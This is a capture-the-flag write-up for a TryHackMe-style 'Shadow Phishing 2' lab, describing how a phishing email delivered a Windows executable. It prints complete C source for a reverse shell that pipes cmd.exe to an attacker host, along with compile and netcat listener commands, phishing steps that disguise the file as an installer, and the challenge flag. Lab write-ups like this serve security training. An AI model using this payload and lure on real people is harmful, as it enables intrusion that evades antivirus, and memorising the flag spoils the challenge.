# Shadow Phishing 2

## Challenge Description
> ![image](https://github.com/user-attachments/assets/58ea1407-3af8-4c52-a498-b2a6e8c8859f)

## Solution
This challenge builds upon the previous **Shadow Phishing** task.

We begin by accessing the webmail interface at:
`http://10.10.201.221/`

Using the provided credentials:
`Username: shadowbyte@darknetmail.corp`
`Password: ShadowIsTheBest`

This logs us into ShadowByte's email account. Our objective is to craft and deliver a malicious Windows 10 x64 executable that can bypass antivirus detection, targeting Cipher (cipher@darknetmail.corp).

![image](https://github.com/user-attachments/assets/d7895a59-cecd-4f3e-a345-08aaeb86ac1c)

A quick Google search suggests that a good approach to evade Windows Defender is to use a NIM Reverse Shell.

![image](https://github.com/user-attachments/assets/1ccccd5b-2945-4b16-843a-9a35680c658f)

To set up a Nim reverse shell development environment on Kali Linux, first install the MinGW-w64 cross-compiler using `sudo apt install mingw-w64` to enable Windows executable compilation. Next, clone the Nim reverse shell repository with `git clone https://github.com/Sn1r/Nim-Reverse-Shell` to access the project files. For the Nim language installation, follow the comprehensive guide at [Jonathan Turnock's Nim Tutorial](https://jonathanturnock.github.io/nim-tutorials/docs/linux-installation), which provides reliable installation methods including using the official `choosenim` installer (`curl https://nim-lang.org/choosenim/init.sh -sSf | sh`) and adding Nim to your PATH. This approach ensures you have all necessary components configured properly for compiling both Linux and Windows versions of the reverse shell. After installation, verify everything works by checking versions with `nim --version` and `x86_64-w64-mingw32-gcc --version`, then proceed to build the payload using the Nim's compiler commands.

However, the initial attempt to deploy the reverse shell was unsuccessful because the compiled executable failed to transfer to the target system. 

A writeup on [tjf952's GitBook](https://tjf952.gitbook.io/disboard/try-hack-me/hackfinity#shadow-phishing-2) provided a working C reverse shell example.
```
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

#define SERVER "<REDACTED>"
#define PORT 4444

void ReverseShell() {
	WSADATA wsa;
	SOCKET sock;
	struct sockaddr_in server;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char recvData[1024];

	WSAStartup(MAKEWORD(2,2), &wsa);
	sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(SERVER);
	server.sin_port = htons(PORT);

	connect(sock, (struct sockaddr *)&server, sizeof(server));

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE)sock;
	si.hStdOutput = (HANDLE)sock;
	si.hStdError = (HANDLE)sock;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

int main() {
	ReverseShell();
	return 0;
}
```

> [!NOTE]  
> ### Steps to Generate the Malicious Windows Executable bypass Windows Defender
> 1. To create our payload, we use  x86_64-w64-mingw32-gcc
>    
>    ```
>    x86_64-w64-mingw32-gcc -o revshell.exe revshell.c -static -lws2_32
>    ```

![image](https://github.com/user-attachments/assets/337df024-10ec-4e4d-b70f-acc691ea4f7d)

To receive a connection when the target opens the malicious executable, we used rlwrap:
> [!NOTE]  
> ### Setting Up a Listener
> 1. Open a terminal and setup listener:
>    
>    ```
>    rlwrap nc -lvnp 4444
>    ```
  
Now, when the target opens the executable, we will receive a reverse shell.

The next step is to send the phishing email.
> [!NOTE]
> ### Sending the Phishing Email
> 1. Log into the webmail interface.
> 2. Compose a new email addressed to cipher@darknetmail.corp.
> 3. Attach the malicious executable (renaming it to something convincing like SilentEdgeInstaller.exe).
> 4. Write a persuasive message to encourage the recipient to open the document.
> 5. Send the email.

Once the target opens the document, our reverse shell should trigger within ~2 minutes.

After some time, we receive a reverse shell, confirming that Cipher has executed the payload:

![image](https://github.com/user-attachments/assets/8326be7b-9020-47c1-bcb3-ba98910cb3b8)

We navigated to the Administrator’s Desktop:
```
C:\Windows\system32 > cd c:/users/Administrator/Desktop
c:/users/Administrator/Desktop > dir
```
We retrieved the flag:
```
c:/users/Administrator/Desktop > type flag.txt
THM{3m41l_ph1sh1ng_1s_n0t_s0_3z}
```

## Conclusion
This challenge showcases the real-world impact of phishing combined with antivirus evasion techniques. By crafting a Windows executable that bypasses Defender, we successfully compromised the target system through a seemingly benign email and retrieve the flag.

## Flag
THM{3m41l_ph1sh1ng_1s_n0t_s0_3z}
